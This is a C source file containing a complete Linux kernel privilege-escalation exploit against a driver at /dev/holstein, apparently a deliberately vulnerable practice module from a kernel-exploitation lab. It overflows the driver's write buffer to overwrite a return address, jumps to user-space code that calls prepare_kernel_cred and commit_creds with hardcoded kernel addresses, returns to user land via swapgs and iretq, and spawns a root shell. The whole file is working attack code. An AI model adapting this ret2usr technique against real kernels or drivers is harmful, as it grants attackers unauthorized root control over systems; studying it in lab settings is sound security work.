#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char *VULN_DRV = "/dev/holstein";
void spawn_shell();

int64_t global_fd = 0;

uint64_t user_cs, user_ss, user_rflags, user_sp;
uint64_t prepare_kernel_cred = 0xffffffff8106e240;
uint64_t commit_creds = 0xffffffff8106e390;
uint64_t user_rip = (uint64_t)spawn_shell;

void open_dev() {
  global_fd = open(VULN_DRV, O_RDWR);
  if (global_fd < 0) {
    printf("[!] failed to open %s\n", VULN_DRV);
    exit(-1);
  } else {
    printf("[+] successfully opened %s\n", VULN_DRV);
  }
}

void spawn_shell() {
  puts("[+] returned to user land");
  uid_t uid = getuid();
  if (uid == 0) {
    printf("[+] got root (uid = %d)\n", uid);
  } else {
    printf("[!] failed to get root (uid: %d)\n", uid);
    exit(-1);
  }
  puts("[*] spawning shell");
  char *argv[] = {"/bin/sh", NULL};
  char *envp[] = {NULL};
  execve("/bin/sh", argv, envp);
  puts("[+] win!");
  exit(0);
}

void save_userland_state() {
  puts("[*] saving user land state");
  __asm__(".intel_syntax noprefix;"
          "mov user_cs, cs;"
          "mov user_ss, ss;"
          "mov user_sp, rsp;"
          "pushf;"
          "pop user_rflags;"
          ".att_syntax");
}

void privesc() {
  __asm__(".intel_syntax noprefix;"
          "movabs rax, prepare_kernel_cred;"
          "xor rdi, rdi;"
          "call rax;"
          "mov rdi, rax;"
          "movabs rax, commit_creds;"
          "call rax;"
          "swapgs;"
          "mov r15, user_ss;"
          "push r15;"
          "mov r15, user_sp;"
          "push r15;"
          "mov r15, user_rflags;"
          "push r15;"
          "mov r15, user_cs;"
          "push r15;"
          "mov r15, user_rip;"
          "push r15;"
          "iretq;"
          ".att_syntax;");
}

void overwrite_ret() {
  puts("[*] trying to overwrite return address of write op");
  uint64_t ret_off = 0x408;
  char payload[0x410];
  memset(payload, 'A', ret_off);
  *(uint64_t *)&payload[ret_off] = (uint64_t)privesc; // return address

  uint64_t data = write(global_fd, payload, sizeof(payload));

  puts("[-] if you can read this we failed the mission :(");
}

int main(int argc, char **argv) {
  open_dev();
  save_userland_state();
  overwrite_ret();
  close(global_fd);

  return 0;
}